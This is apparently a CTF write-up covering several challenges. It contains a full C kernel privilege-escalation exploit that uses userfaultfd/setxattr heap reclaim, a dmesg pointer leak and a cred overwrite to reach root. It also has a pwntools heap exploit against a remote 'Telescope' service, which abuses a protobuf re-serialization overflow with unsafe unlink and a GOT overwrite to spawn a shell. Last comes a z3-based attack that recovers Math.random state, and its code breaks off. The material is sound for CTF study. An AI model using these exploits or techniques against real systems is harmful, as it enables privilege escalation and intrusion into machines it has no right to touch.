	sem_t unblock_sema;
	void *addr;
};

static void *fault_thread(void *arg)
{
	struct fault_arg *param = (struct fault_arg *)arg;

	unsigned char *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	assert(page != MAP_FAILED);
	page[0] = 0xff; // top byte for traversal addr

	// create a userfaultfd object
	int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	assert(uffd != -1);

	// enable the userfaultfd object
	struct uffdio_api uffdio_api;
	uffdio_api.api = UFFD_API;
	uffdio_api.features = 0;
	assert(ioctl(uffd, UFFDIO_API, &uffdio_api) == 0);

	// n_addr is the start of where you want to catch the pagefault. In our
	// case, we set it to the address of page 2
	struct uffdio_register uffdio_register;
	uffdio_register.range.start = (unsigned long)param->addr;
	uffdio_register.range.len = 0x1000;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
	assert(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == 0);

	assert(sem_post(&param->fault_sema) == 0);

	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd, 1, -1);
	assert(nready != -1);

	struct uffd_msg msg;
	assert(read(uffd, &msg, sizeof(msg)) == sizeof(msg));
	assert(msg.event == UFFD_EVENT_PAGEFAULT);

	assert(sem_post(&param->fault_sema) == 0);

	assert(sem_wait(&param->unblock_sema) == 0);

	struct uffdio_copy uffdio_copy;
	uffdio_copy.src = (unsigned long) page;
	uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address & ~0xfffUL;
	uffdio_copy.len = 0x1000;
	uffdio_copy.mode = 0;
	uffdio_copy.copy = 0;
	assert(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == 0);

	close(uffd);
	munmap(page, 0x1000);

	return NULL;
}

struct setxattr_arg {
	const void *buf;
	size_t size;
};

static void *setxattr_thread(void *arg)
{
	struct setxattr_arg *param = (struct setxattr_arg *)arg;
	assert(setxattr(".", "nonexistent", param->buf, param->size, XATTR_REPLACE) == -1);
	return NULL;
}

struct reclaim_ctx {
	struct fault_arg fault_arg;
	struct setxattr_arg setxattr_arg;
	pthread_t setxattr_handle;
};

static void reclaim_alloc_raw(struct reclaim_ctx *ctx, char *buf)
{
	char *mem = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	assert(mem != MAP_FAILED);

	ctx->fault_arg.addr = mem + 0x1000;
	assert(sem_init(&ctx->fault_arg.fault_sema, 0, 0) == 0);
	assert(sem_init(&ctx->fault_arg.unblock_sema, 0, 0) == 0);

	pthread_t handle;
	assert(pthread_create(&handle, NULL, fault_thread, &ctx->fault_arg) == 0);
	assert(sem_wait(&ctx->fault_arg.fault_sema) == 0);

	char *node = mem + 0x1000 - 0x7e;
	// memcpy could cross boundaries
	for (int i = 0; i < 0x7e; i++)
		node[i] = buf[i];

	ctx->setxattr_arg.buf = node;
	ctx->setxattr_arg.size = 0x7f; // avoid copy_from_user 16b optimization
	assert(pthread_create(&ctx->setxattr_handle, NULL, setxattr_thread, &ctx->setxattr_arg) == 0);

	assert(sem_wait(&ctx->fault_arg.fault_sema) == 0);
}

static void reclaim_alloc(struct reclaim_ctx *ctx, unsigned int is_finalized,
                          unsigned long num_children, unsigned long traversal_idx,
						  unsigned long traversal)
{
	char buf[0x80];
	memset(buf, 0, sizeof(buf));
	*(unsigned int *)(buf + 0x8) = 1; // refcount
	*(unsigned int *)(buf + 0x30) = is_finalized; // is_finalized
	*(unsigned long *)(buf + 0x58) = num_children; // num_children
	*(unsigned long *)(buf + 0x70) = traversal_idx; // traversal_idx
	*(unsigned long *)(buf + 0x78) = traversal; // traversal

	reclaim_alloc_raw(ctx, buf);
}

static void reclaim_free(struct reclaim_ctx *ctx)
{
	assert(sem_post(&ctx->fault_arg.unblock_sema) == 0);
	assert(pthread_join(ctx->setxattr_handle, NULL) == 0);
}

static void stage1_leak_dmesg(unsigned long *dist_addrp, unsigned long *edges_addrp)
{
    int i, sz;
    char *buf;

    sz = klogctl(10, NULL, 0);
	assert(sz != -1);

    buf = malloc(sz);
    assert(klogctl(3, buf, sz) != -1);

	unsigned long dist_addr = 0, edges_addr = 0;
    for (i = 0; i < sz && (!dist_addr || !edges_addr); i++) {
        if (!dist_addr && !strncmp(buf + i, "RAX: ", 5)) {
            if (sscanf(buf + i + 5, "%lx", &dist_addr) != 1)
				dist_addr = 0;
        }
		if (!edges_addr && !strncmp(buf + i, "R09: ", 5)) {
            if (sscanf(buf + i + 5, "%lx", &edges_addr) != 1)
				edges_addr = 0;
        }
    }
	assert(dist_addr && edges_addr);

	free(buf);

    *dist_addrp = dist_addr;
	*edges_addrp = edges_addr;
}

// resulting size should be in a rarely used cache
// this is supposed to be arbitrary but if you change it you'll mess up stage 3
#define S1_DIST_NUM_NODES 12

static void stage1(unsigned long *dist_addrp, unsigned long *node_addrp, int *node_fdp)
{
	fprintf(stderr, "[S1] Creating graph\n");
	int fds[S1_DIST_NUM_NODES];
	for (int i = 0; i < S1_DIST_NUM_NODES; i++)
		fds[i] = create();
	for (int i = 1; i < S1_DIST_NUM_NODES; i++)
		llink(fds[0], fds[i], 1);

	fprintf(stderr, "[S1] Freeing node\n");
	release(fds[S1_DIST_NUM_NODES-1]);

	pid_t pid = fork();
	assert(pid != -1);

	if (pid == 0) {
		fprintf(stderr, "[S1] Reclaiming node\n");
		struct reclaim_ctx ctx;
		reclaim_alloc(&ctx, 1, 0, 0x4141000000000000UL, 0);

		fprintf(stderr, "[S1] Finalizing root\n");
		finalize(fds[0]);

		fprintf(stderr, "[S1] Performing crash query\n");
		query(fds[0], fds[1]);

		// Will never get here
		exit(1);
	}

	usleep(250 * 1000);

	fprintf(stderr, "[S1] Leaking from dmesg\n");
	unsigned long dist_addr, edges_addr;
	stage1_leak_dmesg(&dist_addr, &edges_addr);
	unsigned long node_addr = edges_addr - 0x60;
	fprintf(stderr, "[S1] Dist @ 0x%lx\n", dist_addr);
	fprintf(stderr, "[S1] Node @ 0x%lx\n", node_addr);

	*dist_addrp = dist_addr;
	*node_addrp = node_addr;
	*node_fdp = fds[0];
#undef STAGE1_NUM_NODES
}

static void stage2_spray(int *fd, int before, int n, int skip, int after)
{
	for (int i = 0; i < before; i++)
		create();
	for (int i = 0; i < n; i++)
		fd[i] = create();
	for (int i = 0; i < n; i += skip) {
		release(fd[i]);
		fd[i] = -1;
	}
	for (int i = 0; i < after; i++)
		create();
}

static void stage2(struct reclaim_ctx *victim_ctx, int *victim_fdp)
{
#define STAGE2_NUM_NODES 16 // dist array size == 0x80 == sizeof node
	fprintf(stderr, "[S2] Creating graph\n");
	int fds[STAGE2_NUM_NODES];
	for (int i = 0; i < STAGE2_NUM_NODES; i++)
		fds[i] = create();
	for (int i = 1; i < STAGE2_NUM_NODES; i++)
		llink(fds[0], fds[i], 1); // 1 will be written at traversal_idx

	fprintf(stderr, "[S2] Freeing node\n");
	release(fds[STAGE2_NUM_NODES-1]);

	fprintf(stderr, "[S2] Reclaiming node\n");
	reclaim_alloc(victim_ctx, 1, 0, (0x80 + 0x8) / 8, 0); // target: sprayed refcount

	fprintf(stderr, "[S2] Finalizing root\n");
	finalize(fds[0]);

	fprintf(stderr, "[S2] Creating predecessor\n");
	int spray_incref_fd = create();

#define STAGE2_SPRAY_NUM 200
	fprintf(stderr, "[S2] Spraying nodes\n");
	int spray_fd[STAGE2_SPRAY_NUM];
	stage2_spray(spray_fd, 30, STAGE2_SPRAY_NUM, 4, 30);

	fprintf(stderr, "[S2] Incrementing sprayed refcounts\n");
	for (int i = 0; i < STAGE2_SPRAY_NUM; i++) {
		if (spray_fd[i] != -1)
			llink(spray_incref_fd, spray_fd[i], 0);
	}
	finalize(spray_incref_fd);

	fprintf(stderr, "[S2] Corrupting refcount\n");
	query(fds[0], fds[1]);

	fprintf(stderr, "[S2] Freeing victim node\n");
	release(spray_incref_fd);

	fprintf(stderr, "[S2] Reclaiming victim node\n");
	reclaim_free(victim_ctx); // unblock fault
	// ephemeral alloc to put two 0xff at the end for traversal top bytes
	unsigned char buf[0x80];
	buf[sizeof(buf)-1] = 0xff;
	buf[sizeof(buf)-2] = 0xff;
	assert(setxattr(".", "nonexistent", buf, sizeof(buf), XATTR_REPLACE) == -1);
	reclaim_alloc(victim_ctx, 0, 1337, 0, 0);

	fprintf(stderr, "[S2] Searching for victim node\n");
	int victim_fd = -1;
	for (int i = 0; i < STAGE2_SPRAY_NUM; i++) {
		if (spray_fd[i] != -1) {
			struct spark_info info = {
				.num_children = 0,
			};
			get_info(spray_fd[i], &info);
			if (info.num_children == 1337) {
				victim_fd = spray_fd[i];
				break;
			}
		}
	}
	assert(victim_fd != -1);

	fprintf(stderr, "[S2] Victim fd = %d\n", victim_fd);
	*victim_fdp = victim_fd;
#undef STAGE2_SPRAY_NUM
#undef STAGE2_NUM_NODES
}

#define STAGE3_READ_NUM_CHILDREN 0x4142133703030303

static unsigned long stage3_read(struct reclaim_ctx *ctx, int fd, unsigned long addr)
{
	reclaim_free(ctx);
	// during read, we keep a special num_children so we can find ourselves
	reclaim_alloc(ctx, 1, STAGE3_READ_NUM_CHILDREN, 0, addr);

	struct spark_info info;
	get_info(fd, &info);
	return info.traversal_size;
}

static void stage3(struct reclaim_ctx *ctx, int fd, int *scratch_fds, unsigned long s1_dist_addr,
                   unsigned long s1_node_addr)
{
	char buf[0x80];

	fprintf(stderr, "[S3] Finding victim node\n");
	unsigned long victim_addr = 0;
	for (int i = 6000; i < 10000; i++)  {
		unsigned long addr = s1_node_addr + i*0x80;
		unsigned long value = stage3_read(ctx, fd, addr + 0x58);
		if (value == STAGE3_READ_NUM_CHILDREN) {
			victim_addr = addr;
			break;
		}
	}
	assert(victim_addr);
	fprintf(stderr, "[S3] Victim @ 0x%lx\n", victim_addr);

	fprintf(stderr, "[S3] Findings creds\n");
	unsigned long current = stage3_read(ctx, fd, victim_addr + 0x10); // state_lock.owner
	fprintf(stderr, "[S3] current = 0x%lx\n", current);
	unsigned long cred_addr = stage3_read(ctx, fd, current + 0xa90);
	fprintf(stderr, "[S3] cred @ 0x%lx\n", cred_addr);

	fprintf(stderr, "[S3] Crafting linkable node\n");
	memset(buf, 0, sizeof(buf));
	*(unsigned long *)(buf + 0x0) = 100000; // id
	*(unsigned int *)(buf + 0x8) = 1; // refcount
	*(unsigned int *)(buf + 0x30) = 0; // is_finalized
	*(unsigned long *)(buf + 0x60) = victim_addr + 0x60; // edges.next (empty list)
	*(unsigned long *)(buf + 0x68) = victim_addr + 0x68; // edges.prev (empty list)
	reclaim_free(ctx);
	reclaim_alloc_raw(ctx, buf);

	fprintf(stderr, "[S3] Building graph\n");
	int graph_fds[S1_DIST_NUM_NODES];
	for (int i = 0; i < S1_DIST_NUM_NODES-1; i++)
		graph_fds[i] = scratch_fds[i]; // avoid allocations, they mess stuff up
	for (int i = 1; i < S1_DIST_NUM_NODES-1; i++)
		llink(graph_fds[0], graph_fds[i], 0);
	llink(graph_fds[0], fd, 0);  // weight = write primitive value (zero for root creds)
	finalize(graph_fds[0]);

	fprintf(stderr, "[S3] Freeing stage1 dist array\n");
	memset(buf, 0, sizeof(buf));
	*(unsigned int *)(buf + 0x8) = 1; // refcount
	*(unsigned int *)(buf + 0x30) = 1; // is_finalized
	// fake node_array overlaps unused nb_lock
	*(unsigned long *)(buf + 0x38 + 0x0) = 0; // fake node_array.size
	*(unsigned long *)(buf + 0x38 + 0x10) = s1_dist_addr; // fake node_array.nodes (will be freed)
	*(unsigned long *)(buf + 0x60) = victim_addr + 0x60; // edges.next (empty list)
	*(unsigned long *)(buf + 0x78) = victim_addr + 0x38; // traversal = fake node_array
	reclaim_free(ctx);
	reclaim_alloc_raw(ctx, buf);
	release(fd); // free s1_dist_addr
	fd = create(); // immediately reclaim victim node to restore stable state

	fprintf(stderr, "[S3] Overwriting cred\n");
	unsigned long write_addr = cred_addr + 8*3;
	unsigned long idx = (write_addr - s1_dist_addr) / 8;
	reclaim_free(ctx);
	reclaim_alloc(ctx, 1, 0, idx, 0);
	query(graph_fds[0], graph_fds[1]);
}

static void print_flag()
{
	int fd = open("/flag", O_RDONLY);
	assert(fd != -1);

	char buf[100];
	memset(buf, 0, sizeof(buf));
	assert(read(fd, buf, sizeof(buf)-1) != -1);
	close(fd);

	fprintf(stderr, "!!! FLAG: %s\n", buf);
}

int main(void)
{
	int scratch_fds[12];
	for (int i = 0; i < 12;  i++)
		scratch_fds[i] = create();

	// Leak a distance array (still malloc'ed) and the address of a live node
	unsigned long s1_dist_addr, s1_node_addr;
	int s1_node_fd;
	stage1(&s1_dist_addr, &s1_node_addr, &s1_node_fd);

	// Get a fd that can be freed and reclaimed repeatedly
	struct reclaim_ctx victim_ctx;
	int victim_fd;
	stage2(&victim_ctx, &victim_fd);

	// Get somewhat rootish privileges
	stage3(&victim_ctx, victim_fd, scratch_fds, s1_dist_addr, s1_node_addr);

	print_flag();
}
```

[https://youtu.be/3-4cnyswp4w](https://youtu.be/3-4cnyswp4w)


Telescope
---------

> Look up in the sky ⇑
>
> nc 13.112.193.37 8573
>
> Note:
> The service is running on Ubuntu 20.04

### Challenge Releas Content

|              file | comment                                             |
| -----------------:| --------------------------------------------------- |
|   telescope.proto | This is the description of the protocol of protobuf |
|         telescope | the binary to exploit                               |
| libprotobuf.so.17 | protobuf remote library                             |
|         libc.so.6 | libc remote library                                 |

### The Binary

The binary is simple to understand is the classic few option CTF binary.
It is possible to create read and modify heap chunks with an extra interesting option that is to interpret the bytes ad protobuf protocol.
Chunks are saved on an array of 1024 elements in `.bss` called `slots`, and the corresponding size is saved on another array in `.bss` called `slot_sizes`.
In particulare, there are 6 options:

#### [1] Create chunk

It asks you for the number of slots and the size. It makes a malloc of the given
size, memset the chunk to zero, and store a pointer to the new chunk into
`slots[<index>]` where `<index>` is also a parameter chosen by the user. It also
set `slots_sizes[<index>]` to the corrisponding size.

#### [2] Read data into a chunk

It asks for a slots index and then lets you write inside the chunk. The amount
of bytes that you can write is the number of the size saved into `slots_sizes`.
Bytes are read singularly. There is no possibility of short-read (read fewer
bytes than the size).

#### [3] Free chunk

It asks for a slot index. It calls `free` on the pointer stored at
`slots[<index>]` . It stores 0 into `slots[<index>]` and `slots_size[<index>]`

#### [4] Protobuf unserialize and reserialize

This is the most complicated option, and the only one that took a few hours to
be completely understood. It asks for a slot index. It parses the content with
the protobuf parser generating the `Telescope` object. It checks that the field
`pass` of the `Telescope` object is equal to `0xDEADBEEF`. If the `pass` field
is not correctly set, you get an abort.

If you manage to pass this check, the program removes the field `pass`.
It prints out the number of `lens` (the other field of `Telescope`).
It serializes the new object to a string. It uses a `memcpy` to copy the new string (byte representation of the object) into the slot.

#### [5] Prints the chunk

It asks for an index. It prints out `slots_sizes[<index>]` bytes of
`slots[<index>]`.

#### [-] Exit

Any other option exit the program.

### ProtoBuf

Protobuf is a nice library that lets you define structured data that can be
serialized and read back. It is nice because it supports many languages and
automatically generates code to handle these data.

```ocaml
syntax = "proto2";

message Telescope {
    repeated int64 lens = 1;
    optional int64 pass = 2;
}
```

There are 2 fields in this object. `pass` is optional and need to be set to
`0xDEADBEEF` because the code checks its value. `lens` is an array of integers.
It can be empty or any size.

It is vital to understand how the encoding of protobuf works. You can find
details of the encoding on
[protobuf documentation](https://developers.google.com/protocol-buffers/docs/encoding).
The documentation is written very well and explains how the encoding is working
way better than I will ever be able to do. If you want to understand the
vulnerability, you need to read the documentation and understand the
serialization types.

Here I give you an example of a `Telescope` object is encoded:

```
\x08\x17\x08\x20\x10\x11
```

Protobuf encode the field and is type in one byte followed by the value
`(field_number << 3) | wire_type`. If you want to encode field numeber 1 with
type 0 you get `1 << 3 | 0 = 0x08`. In particular, the byte `\x08` represent the
field `lens` while `\x10` is the field `pass`. In this paricular string we have
2 elements for `lens`: `\x08\x17` and `\x08\x20`. `\x10\x11` is instead the
encoding of `pass`. Hence, when deserialized we will have
`obj.lens = [0x17, 0x20] ` and `obj.pass = 0x11`.

### Testing Protobuf

I spent hours playing with protobuf serialization. It was evident to me (after a
while playing CTF you develop an intuition on where the author wants you to
look.) that the vulnerability was in encoding/decoding protobuf. I tried several
things. I do not recall them all. I had a python and a c++ program that I can
use as a decoder/encoder debug.

Few intresting discovery that I recall. The order of elements does not matter.
You can have few lens the a pass and other lens: `\x08\x17\x10\x11\x08\x20` is
valid and still decode to `obj.lens = [0x17, 0x20] ` and `obj.pass = 0x11`

You can have multiple instances for `pass`: `\x08\x17\x10\x11\x08\x20\x10\x11`
is valid and still decode to `obj.lens = [0x17, 0x20] ` and `obj.pass = 0x11`.

### The Vulnerability

I discovered that there are at least 2 ways to encode repeated fields. The
preferred way to encode a repeated field in protobuf is to have multiple
instances of a field. In fact, if you serialize `obj.lens = [0x17, 0x20]` you
get `\x08\x17\x08\x20`. Another "valid" way to encode a repeated field is to use
[`Lenght'delimited` type](https://developers.google.com/protocol-buffers/docs/encoding).
In this case `\x0a\x02\x17\x20` is still decoded as `obj.lens = [0x17, 0x20]`.
In particular, `\x0a` is field number 1 with type 2 (`1 << 3 | 2 = 0x0a`). 0x0a
is followed by the size of the content (2 bytes in this case). Then there is the
encoding of multiple numbers. (N.B. the numbers are always encoded as
[`Variant`](https://developers.google.com/protocol-buffers/docs/encoding), you
can have any number not only single bytes).

If you deserialize and the serialize back `\x0a\x02\x17\x20` you get the string
`\x08\x17\x08\x20`. Both are 4 bytes, so this particular instance is not a
problem.

However, if you deserialize and serialize `\x0a\x02\x17\x20\x17`, you get back
`\x08\x17\x08\x20\x08\x17`. The first string is 5 bytes; the second is 6 bytes.
For every single byte that we add in the first string, we get 2 bytes in the
second. This allows us to overflow a chunk.

### The Exploit

- We have a heap overflow where we can easily control the last byte.
- We have arbitrary read and write in any chunk that we control.
- We have a list of .bss containing pointers to our chunks.

This is an excellent candidate to do an
[unsafe_unlink](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c).

Our exploit aims to exploit an unsafe_unlink to overwrite one of the pointers in
`slots` to point to `slots`. This will allow us to arbitrarily change the
pointer of a slot and have arbitrary read and arbitrary write primitives. With
those primitives, we can read `.got` to leak libc and change the function `free`
with function `system`. Please note that the binary is not `PIE` and is not
`Full RELRO`.

### The Unsafe Unlink

This step aims to overwrite one of the pointers in `slots` with an address of
`slots`. This is possible by exploiting the unlink function of libc. When
eliminating a chunk from the free list, the unlink algorithm of libc will
overwrite the previous chunk's forward ptr. We can exploit this write by faking
that the previous chunk is on `.bss`. There are several checks in the libc that
you need to meet to have unlink successfully. You can play with
[how2heap]((https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c))
to understand those constraints.

In practice, we create a fake chunk header 0x10 bytes below one valid chunk.
(You can do this because 0x10 bytes below the header begins the data part of the
chunk). We do an overflow from one chunk to another, changing the `PREV_IN_USE`
bit from 1 to 0. We set the prev_size to be 0x10 byte less than the real one.
When we free the second chunk, a `consolidate` is triggered, trying to merge
multiple chunks, so our chunk is unlinked, causing the overwrite.

### Aligning the ~~Stars~~ Chunks

To trigger the consolidate, we need our chunk to be contiguous to the top_chunk.
The size of the chunk that we choose to make this attack is 0x458.
Reason to choose this size:

- It needs NOT to be a fastbin.
- We need to be able to overwrite the prev_size filed.

The prev_size fields are placed as the last 8 bytes of the chunks.
`malloc(0x458)` will create a chunk of 0x460 bytes.

In our exploit, we allocate 20 chunks of sizer 0x458. This will remove all the
free chunks of that size.

We allocate some `extra_sizes` (`0x410, 0x470, 0x13b0, 0x2010`). Those are chunk
size that will be used by protobuf deserialize and serialize functions. The idea
is to preallocate those chunks to avoid them from being between our attacked
chunk and the top_chunk. If you wonder, we got the size with gdb by looking at
which chunks were between our attacked chunk and the top_chunk.

We allocate 3 chunks of size `0x460`:

1. The first chunk (`chunk_c`) is there as a used chunk. We need to consolidate
   only 2 chunks, so we use the first chunk as a barrier.
2. The second chunk (`chunk_a`) is the chunk that we are using as a fake chunk
   and the chunk to do the overflow.
3. The third (`chunk_b`) chunk is the chunk that will be overflown by over byte.

After the allocation, we deallocate the extra_sizes chunk. Now they are
available for the protobuf algorithm, and they will not interfere with our
attack.

### Arbitrary Read/Write

With unsafe unlink, you can overwrite one of the pointers in `slots` and have
that pointer pointing to `slots` as well. This will allow you to control any
pointer with data that you want.

To build a decent primitive arbitrary read-write. We made `slots[20]` pointing
to `slots[21]`. And both were chunks allocated with size 8. By writing in
`slots[20]` we set the `address` of our primitive. by reading-writing
`slots[21]`, we exploit the read-write.

With this primitive, we can, by reading the value of puts in .got, get a leak of
libc. We can compute the position of the `system,` and we can substitute free in
.got with the `system`. At this point, we just need to free a chunk which
content is `/bin/sh\x00` to get a shell.

### The script

```python
from pwn import *

r = remote("13.112.193.37", 8573)

def alloca_slot(slot, size):
    assert(slot <= 0x400)
    assert((size & 0x80000000) == 0)
    r.sendline("1")
    r.recvuntil("slot>\n")
    r.sendline("%d" % slot)
    r.recvuntil("size>\n")
    r.sendline("%d" % size)

def write_slot(slot, data):
    assert(slot <= 0x400)
    r.sendline("2")
    r.recvuntil("slot>\n")
    r.sendline("%d" % slot)
    r.send(data)

def free_slot(slot):
    assert(slot <= 0x400)
    r.sendline("3")
    r.recvuntil("slot>\n")
    r.sendline("%d" % slot)

def parse_slot(slot):
    assert(slot <= 0x400)
    r.sendline("4")
    r.recvuntil("slot>\n")
    r.sendline("%d" % slot)

def print_slot(slot):
    assert(slot <= 0x400)
    r.sendline("5")
    r.recvuntil("slot>\n")
    r.sendline("%d" % slot)
    return r.recvuntil("op>\n")[:-4]


# lens = b"\x41" * 40
# data = b"\x10\xef\xfd\xb6\xf5\x0d" + b"\x0a"+bytes([len(lens),]) +  lens
# print(data)

overflow = b"\x0a\x0b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x60"
pass_data = b"\x10\xef\xfd\xb6\xf5\x0d"
filling = b"\x08" * 1090 + b"\x0a\x02\x80\x08"

data = pass_data + filling + overflow

chunk_size = 0x458

assert(len(data) == chunk_size)

for i in range(0, 20):
    alloca_slot(i, chunk_size)


extra_sizes = [0x410, 0x470, 0x13b0, 0x2010]
extra_space = i
for i in range(extra_space, extra_space+len(extra_sizes)):
    print("allocat_empy %d" % i )
    alloca_slot(i, extra_sizes[i - extra_space] - 0x10)


data = data.ljust(chunk_size, b"\x00")
chunk_a = i + 1
chunk_b = i + 2
chunk_c = i + 3
print("a: %d, b: %d" % (chunk_a, chunk_b))
alloca_slot(chunk_c, chunk_size)
alloca_slot(chunk_a, chunk_size)
alloca_slot(chunk_b, chunk_size)

for i in range(extra_space, extra_space+len(extra_sizes)):
    print("free %d" % i )
    free_slot(i)

write_slot(chunk_a, data)
s = print_slot(chunk_a)
parse_slot(chunk_a)
s2 = print_slot(chunk_a)

slots_base = 0x409280

addre_23 = slots_base + 23*8 # chunk_a

new_chunk_a = p64(0x0) + p64(0x451) + p64(addre_23 - 0x18) + p64(addre_23 - 0x10) + p64(0) + p64(0) + b"c"*8 + b"d"*8 + b"e"*8
new_chunk_a = new_chunk_a.ljust(0x450, b"B") + p64(0x450)
# input("wait for write")
write_slot(chunk_a, new_chunk_a)
# input("wait for free")
free_slot(chunk_b)

slots_data = print_slot(chunk_a)
puts_got = 0x4091A8

alloca_slot(20, 8)
alloca_slot(21, 8)
# input("check chunka")
payload =  p64(0x409328) + p64(puts_got)
payload = payload.ljust(chunk_size, b"\x00")
r.recvuntil("op>\n")
write_slot(chunk_a, payload)


context.log_level = "DEBUG"
r.recvuntil("op>\n")
puts_leak = u64(print_slot(21))
libc_base = puts_leak - 0x875a0
system_libc = libc_base + 0x55410
free_got = 0x409128
print("[!] puts_atlibc: %x" % puts_leak)
print("[!] libc_base: %x" % libc_base)
print("[!] libc_system: %x" % system_libc)

write_slot(20, p64(free_got))
write_slot(21, p64(system_libc))
write_slot(1, b"/bin/sh".ljust(chunk_size, b"\x00"))
r.sendline("3")
r.recvuntil("slot>\n")
r.sendline("1")

r.interactive()
```


100 pins
--------

> 4 digits pin are too weak... How about 100 of them?
> nc 18.183.134.249 1234

### The bug(s)

The challenge is made with NodeJS (15.3.0) and the main point was
`Math.random()`. This PRNG
[is not cryptographically secure](https://devdocs.io/javascript/global_objects/math/random),
as we can recorver the initial states of the `XorShift128+` with enough
consecutive outputs and some symbolic execution.

We notice that the "Mastermind" behind this challenge allows us to gather more
information than usual, because there is no check on the length of the input. In
fact we can recover the (unique) digits of the pin choosing the pattern:
`'1'*2^0 + '2'*2^1 + '3'*2^2 + '4'*2^3 + ... + '9'*2^8`.

This gives us a result that tells us exactly the digits of the pin. We can get
this by adding the number of digits in the correct position and the remaining
number of correct digits that are not in the correct position. This number, in
binary, gives us the corresponding digit in the pattern.

After getting the digits we find the correct permutation with a "guess and
prune" algorithm, discarding any rearrangement that is incompatible with the
results of the previous guesses.

In the end our algorithm is capable of finding a correct pin with an average of
4-5 attempts, and with a bit of luck we are able to retrieve the 11 pins needed
to ensure that z3 outputs a unique solution in less than 39 attempts.

Once we have the initial state of the PRNG, we face another problem: the actual
values being generated are stored in a "pool" of 64 numbers, that is refreshed
with 64 new ones every time it is empty. The numbers within the pool are then
outputted in reverse order (as explained in this presentation and
[video](https://www.youtube.com/watch?v=_Iv6fBrcbAM)). This means that, if the
order of the random generation is 1...64||65...128, we get 64...54 and we need
to predict 53...1||128...93. Once we get the seed, the "next" number generated
will be the 54th. This means that we need to reverse the XorShift128+ algorithm
to retrieve the values 53...1! Fortunately,
[this isn't a problem at all](https://blog.securityevaluators.com/xorshift128-backward-ff3365dc0c17).

```python
#!/usr/bin/env python3
import os
from pwn import remote, process
import hashlib
from itertools import permutations
import struct
from decimal import *
from random import shuffle
from z3 import *
MAX_UNUSED_THREADS = 2

#Credits to Douglas Goddard and d0nutptr

def reverse17(val):
    top34 = (val ^ (val >> 17)) & 0xFFFFFFFFC0000000
    top51 = (val ^ (top34 >> 17)) & 0xFFFFFFFFFFFFE000
    original = (val ^ (top51 >> 17))
    return original

def reverse23(val):
    bot46 = (val ^ (val << 23)) & 0x3fffffffffff
    original = (val ^ (bot46 <<  23)) & 0xFFFFFFFFFFFFFFFF
    return original

def reverse_xs128p(state0, state1):
    prev_state1 = state0 & 0xFFFFFFFFFFFFFFFF
    prev_state0 = state1 ^ (state0 >> 26) & 0xFFFFFFFFFFFFFFFF
    prev_state0 = prev_state0 ^ state0 & 0xFFFFFFFFFFFFFFFF
    prev_state0 = reverse17(prev_state0) & 0xFFFFFFFFFFFFFFFF
    prev_state0 = reverse23(prev_state0) & 0xFFFFFFFFFFFFFFFF
    generated = prev_state0 & 0xFFFFFFFFFFFFFFFF
    return prev_state0, prev_state1, generated

# Calculates xs128p (XorShift128Plus)
def xs128p(state0, state1):
    s1 = state0 & 0xFFFFFFFFFFFFFFFF
    s0 = state1 & 0xFFFFFFFFFFFFFFFF
    s1 ^= (s1 << 23) & 0xFFFFFFFFFFFFFFFF
    s1 ^= (s1 >> 17) & 0xFFFFFFFFFFFFFFFF
    s1 ^= s0 & 0xFFFFFFFFFFFFFFFF
    s1 ^= (s0 >> 26) & 0xFFFFFFFFFFFFFFFF
    state0 = state1 & 0xFFFFFFFFFFFFFFFF
    state1 = s1 & 0xFFFFFFFFFFFFFFFF
    generated = state0 & 0xFFFFFFFFFFFFFFFF

    return state0, state1, generated

def sym_xs128p(sym_state0, sym_state1):
    # Symbolically represent xs128p
    s1 = sym_state0
    s0 = sym_state1
    s1 ^= (s1 << 23)
    s1 ^= LShR(s1, 17)
    s1 ^= s0
    s1 ^= LShR(s0, 26)
    sym_state0 = sym_state1
    sym_state1 = s1
    # end symbolic execution

    return sym_state0, sym_state1

# Symbolic execution of xs128p
def sym_floor_random(slvr, sym_state0, sym_state1, generated, multiple):
    sym_state0, sym_state1 = sym_xs128p(sym_state0, sym_state1)

    # "::ToDouble"
    calc = LShR(sym_state0, 12)

    lower = from_double(Decimal(generated) / Decimal(multiple))
    upper = from_double((Decimal(generated) + 1) / Decimal(multiple))

    lower_mantissa = (lower & 0x000FFFFFFFFFFFFF)
    upper_mantissa = (upper & 0x000FFFFFFFFFFFFF)
    upper_expr = (upper >> 52) & 0x7FF

    slvr.add(And(lower_mantissa <= calc, Or(upper_mantissa >= calc, upper_expr == 1024)))
    return sym_state0, sym_state1


def solve_instance(points, multiple, unknown_leading=False):
    # setup symbolic state for xorshift128+
    ostate0, ostate1 = BitVecs('ostate0 ostate1', 64)
    sym_state0 = ostate0
    sym_state1 = ostate1
    set_option("parallel.enable", True)
    set_option("parallel.threads.max", (
        max(os.cpu_count() - MAX_UNUSED_THREADS, 1)))  # will use max or max cpu thread support, whatever is smaller
    slvr = SolverFor(
        "QF_BV")  # This type of problem is much faster computed using QF_BV (also, if branching happens, we can use parallelization)

    # run symbolic xorshift128+ algorithm for three iterations
    # using the recovered numbers as constraints

    if unknown_leading:
        # we want to try to predict one value ahead so let's slide one unknown into the calculation
        sym_state0, sym_state1 = sym_xs128p(sym_state0, sym_state1)

    for point in points:
        sym_state0, sym_state1 = sym_floor_random(slvr, sym_state0, sym_state1, point, multiple)

    if slvr.check() == sat:
        # get a solved state
        m = slvr.model()
        state0 = m[ostate0].as_long()
        state1 = m[ostate1].as_long()

        return state0, state1
    else:
        print("Failed to find a valid solution")
        return None, None

def solve_random(points, multiple, lead):
    if lead > 0:
        last_state0 = None
        last_state1 = None

        for i in range(0, int(lead)):
            last_state0, last_state1 = solve_instance(points, multiple, True)

            state0, state1, output = xs128p(last_state0, last_state1)
            new_point = math.floor(multiple * to_double(output))
            points = [new_point] + points

        return last_state0, last_state1
    else:
        return solve_instance(points, multiple)


def to_double(value):
